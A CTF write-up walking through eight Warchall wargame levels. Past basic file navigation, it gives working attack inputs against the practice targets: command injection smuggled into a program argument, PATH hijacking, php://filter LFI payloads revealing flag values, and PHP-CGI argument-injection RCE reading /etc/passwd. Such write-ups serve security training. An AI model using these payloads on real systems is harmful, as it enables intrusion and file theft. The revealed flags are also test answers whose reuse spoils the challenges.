# Warchall-challenge
## Of the 11 challenges we had to deal with, I succeeded in 8. Here are the 3 challenges I couldn't solve:
* Nurxxed
* SSH... Z is sleeping
* 7 Tropical Fruits
## So I'm going to explain step by step how I captured the flag for the 8 challenges I successfully completed.
#
> To start with, I create an SSH account and then connect to the account I've just created by using a terminal.
# 1. The Beginning
### For this level we are asked to search for 6 hidden passwords (level 0-5) in various files
## *LEVEL 0*
#### At the very beginning, I display the contents of the WELCOME.md file with the command :
```
cat WELCOME.md
```
>  **_cat command_** lets you view the contents of a file

#### In this file they welcome me and tell me that I will find the solutions in the level directory. So I go there by typing :
```
cd /home/level/
```
#### Now I'm running a command to list existing files:
```
ls -al
```
> Linux `ls -a command`, show all files and subdirectories in the current directory, including hidden files and `ls -l command`, display detailed information of non-hidden files and directories
#### Then I go to the 00_welcome folder, where there's a README.md file in which the first password is stored
```
cd 00_welcome/
```
```
cat README.md
```
## *LEVEL 1*
#### The file containing the level 1 solution is hidden in one of the many subfolders in the **_01_choice_tree_** directory. I used these commands to access it:
```
cd /home/level/01_choice_tree/
```
```
ls -al
```
```
cd ......
```
#### After rummaging through the folders using cd, cat and ls I found the file containing the password in the folder named **_patience_** which is a sub-subfolder of **_blue_** and display the file contents with :
```
cat SOLUTION.txt
```
## *LEVEL 2*
#### To find the password for this level, you need to explore the hidden folders and files.
> here's how I got here.
```
cd /home/.porb/
```
> The **dot** means it's a hidden folder/file
#### And this is how i recovered the password, which is in a **_.porb_** file :
```
cat .solution
```
## *LEVEL 3*
#### For this level I just need to go to folder **_03_** to find the solution, which is located in the file called  **_.bash_history_**
> As for the last level, I use the same commands to move around a folder, to find out what the folder contains and to read the contents of a file.
```
cd /home/level/03/
```
```
cat .bash_history
```
## *LEVEL 4*
#### Here, when you enter the **_04_kwisatz_** folder, you only see one file that says "Look in your ~".
> The **~** in linux designates the personal directory
#### I then find another file with a password named README2.md, using an absolute path like this :
```
cd /home/user/username/level/04_kwisatz/
```
#### I use the **_cat_** command to read its contents 
## *LEVEL 5*
> The last password to be found to validate **"Beginning"** is the one from this level 5. 
#### So I enter into the **_05_privacy_** directory and the only file it contains is where the password is located
```
cd 05_privacy/
```
```
cat README.md
```
### To sum up, for this challenge we mainly used basic commands to be able to move in folders at different stages, to look at what they contain, even if it's hidden, and to read the contents of a file.

# 2. Choose your Path
> This is the level 10 mini challenge found in /home/level/10_choose_your_path/
### in the *10_choose_your_path* folder there is a file named *charp.c* which contains C language source code that counts the number of characters per line in a file. 
#### Here's the command I used to capture this level's flag:
``` C
./charp "solution.txt; cat solution.txt> ~/expected.txt"
```
> * `./charp` is a command line instruction for a C program
> * This command will run the **charp** program with **solution.txt** as an argument and write it's contents to a file named **expected.txt** in  home directory.
#### After executing this I return go to the home directory :
```
cd
```
#### And then I open the file containing the flag :
```
cat expected.txt
```
# 3. Choose your Path II
>  A level 11 mini challenge found in /home/level/11_choose_your_path2/
### If you look at what's in the folder *11_choose_your_path2* with the ls command, you'll see that it's similar to the previous level in term of content, but their source code are different.
### The script contained in charp2.c is also C code. It's escapes single quotes in a string, single quotes are used to enclose the filename when passed to the wc command.
#### To access to the solution, I used these commands :
``` 
ln -s /bin/sh ~/wc
```
``` 
PATH=~ ./charp2 "/bin/cat solution.txt 1>&2"
```
> * The `ln` command creates a symbolic link named **wc** in home directory that points to the /bin/sh file.
> * The charp2 is a C program that reads a command from the standard input and executes it using the shell interpreter.
> * The PATH environment variable is set to the current directory, and then the charp2 program is executed with the arguments "/bin/cat solution.txt 1>&2".
> * The "/bin/cat solution.txt 1>&2" argument specifies that the `cat` command should be executed with the *solution.txt* file as input and the output should be redirected to the standard error stream. The 1>&2 redirection operator redirects the standard output stream to the standard error stream.
# 4. Py-Tong
> This is the level 12 found in /home/level/12_pytong/
### how i solved this level?
* First I created a shell script that I named **test.sh** who uses a while loop to write the string “Contenu 1” to a file I named *new* in an infinite loop :
```
 nano test.sh
```
```
 #!/bin/bash

while true; do
    echo "example" >> new

done
```
> * This Bash script use a while loop to write the string “example” to a file named new in an infinite loop.
> * The script will continue to run until it is manually stopped.
*Next, I create the file new while still in the home directory :
```
touch new
```
>la commande `touch` peut être utilisée pour créer un fichier vide sans contenu(avec Linux).
* Once the empty file has been created, I can use the command to run the script :
```
./test.sh
```
* At the same time as the script is running, I open another terminal in which I go to the directory /home/level/12_pytong/ where I execute the following command to display the hidden password
```
./pytong /home/user/username/new
```
# 5. Live LFI
## In this challenge, you have to recover the password in a file named solution.php .
* Click on the **Live LFI** challenge link and it will redirect you to a site.
* Click on one of the two flags: the **English** flag or the **German** flag to change the language and the URL will change like this:
  <pre>https://lfi.warchall.net/index.php?lang=en</pre>
* Then change the URL as follows:
  <pre>https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php</pre>
* Here we use ***php://filter*** to introduce ***base64*** encoding, and we use base64 encoding to bypass any filters or security controls in place.
* Then refresh and the content changes, and this is displayed:
```plaintext
PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K
```
> This is the content of `solution.php` that we still have to crack.
* We are then going to open a terminal, putty in my case, and decode this long text in a directory for which we have 755 rights.
* We will execute the following command:
 ```
echo "PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K" | base64 -d -i

```
* The password will be displayed on the console immediately after .
# 6. Live RFI
## This is basically the same as the Live LFI level.
* There's a link to the ***Right-Fi*** challenge
* By clicking on **EN** or **DE** at the top right of the site, the URL will change as this :
 ```
  https://rfi.warchall.net/index.php?lang=en
```
* Then we'll modify it :
```
  https://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php
```
* The home page will be displayed with a long message and Warning messages and, as in the previous level, we're going to decode the long, incoherent text as follows :
```
echo "PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K" | base64 -d -i
```
* The password will then be displayed in the bottom left-hand corner
# 7. Live RCE
## This is the way I solved the challenge. I found that a nice way to test for this vulnerability was to use:
```
http://rce.warchall.net/?-s
```
* the source code is displayed. Now I know I have to see what's inside config.php. Now I knew what to research on Goolgle. After some time I found this attack vector. It is supposed to allow me to include a file remote or local. Doing:
```
http://rce.warchall.net/index.php
?-dsafe_mode=Off+-ddisable_functions=NULL+-dallow_url_fopen=On+-dallow_url_include=On+-dauto_prepend_file=http:://google.com/robots.txt
```
> did not work, but this did:
```
rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/etc/passwd
```
* Then I knew I had access to SSH and I could put a basic PHP script in a file in:
```Plaintext code for /var/tmp/s.txt
<?php
 
echo file_get_contents("../config.php");
```
* Then I know I had to run:
```
rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/var/tmp/s.txt
```
* At the first sight it did not work. Nothing than the index.php's content was shown in the browser. But the flag for this level is now stoked in `/var/tmp/s.txt`
# 8. Tryouts
> Find in /home/level/matrixman/13_tryouts
> * In /home/level/matrixman/13_tryouts, there's a C language code called tryouts.c and its compiled version tryouts. There's also a solution.txt file that we don't have access to.
> * The **tryouts.c** file asks us to guess a random number generated using /dev/urandom
### For this Level to get the flag, I used the following strategy: 
* First, I create a file called cat.c
```
nano cat.c
```
* Then I write a script in this file.
```
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int main(int argc, char *argv[]) {
FILE *fp = fopen(argv[1], "w");
char buf[16];
memset(buf, 0, sizeof buf);
lseek(3, 0, SEEK_SET);
read(3, buf, sizeof buf);
fprintf(fp, "%s", buf);
return 0;
}
```
> This code will read characters from file descriptor 3 *(since in our case descriptors 0 to 2 are probably already used by tryouts.c)* and write them to a file specified as a parameter. We'll use this code to write the contents of ***solution.txt*** to another file.
* Now we'll compile the previous code to create an executable called cat :
```
gcc -m32 cat.c -o cat
```
* Let's run this program, specifying the output file in which to write the contents of solution.txt
> The output file was created in advance with ` touch seed `
```
./cat seed
```
* We've called this program **cat** to use it instead of the **_default cat command_**, which displays the contents of a file. To do this, we'll modify the environment variables :
```
export PATH=$HOME:$PATH
```
> The program will use our cat because of the modified order in the PATH, and so the contents of solution.txt will be written to the file specified when our cat is run (in the seed file).
* Finally, we run tryouts `./tryouts`. And then, restore the default environment variables with the following command:
```
export PATH=$PATH
```
* The password has now been placed in the file where we put the contents of solution.txt, so the flag for this level is available/readable in the file named seed in the home directory.
